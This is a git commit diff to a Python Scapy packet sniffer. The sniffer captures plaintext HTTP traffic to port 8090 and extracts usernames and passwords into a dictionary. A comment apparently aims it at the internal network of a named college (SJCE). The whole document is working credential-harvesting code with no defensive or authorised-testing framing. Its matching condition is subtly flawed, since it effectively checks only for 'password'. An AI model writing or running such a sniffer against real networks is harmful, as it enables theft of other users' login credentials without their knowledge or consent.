343803a68dd8bd76100ec3173a7cfc5c67721a70
Aditya <vaditya06@gmail.com>
2024-03-05 10:58:51 -0500

    Fixed minor bugs in packet sniffer

--- Packet_Sniffer/Packet_sniffer.py
+++ Packet_Sniffer/Packet_sniffer.py
@@ -4,7 +4,8 @@ import re
 
 login_credentials = {}
 def sniff(interface: str):
-    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet, filter="port 8090")
+    # Filter can be applied for port 8090 for accessing just the login credentials
+    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
 
 
 # Field in the layers are accessed using the dot operator
@@ -13,16 +14,17 @@ def process_sniffed_packet(packet):
         if packet.haslayer(scapy.Raw):
             print(packet[scapy.Raw].load)
 
+    # Checks the TCP layer for any raw data, as in the case for the internal network of SJCE
     if packet.haslayer(scapy.TCP):
-        if packet.haslayer(scapy.Raw):
-            load = packet[scapy.Raw].load
-            if "username" and "password" in str(load):
-                # print(load)
-                username = re.findall(r"username=([^&]+)", str(load))
-                password = re.findall(r"password=([^&]+)", str(load))
-                login_credentials[username[0]] = password[0]
-                print(login_credentials)
-
+        if packet[scapy.TCP].dport == 8090:
+            if packet.haslayer(scapy.Raw):
+                load = packet[scapy.Raw].load
+                if "username" and "password" in str(load):
+                    print("test")
+                    username = re.findall(r"username=([^&]+)", str(load))
+                    password = re.findall(r"password=([^&]+)", str(load))
+                    login_credentials[username[0]] = password[0]
+                    print(login_credentials)
 
 
 sniff("eth0")
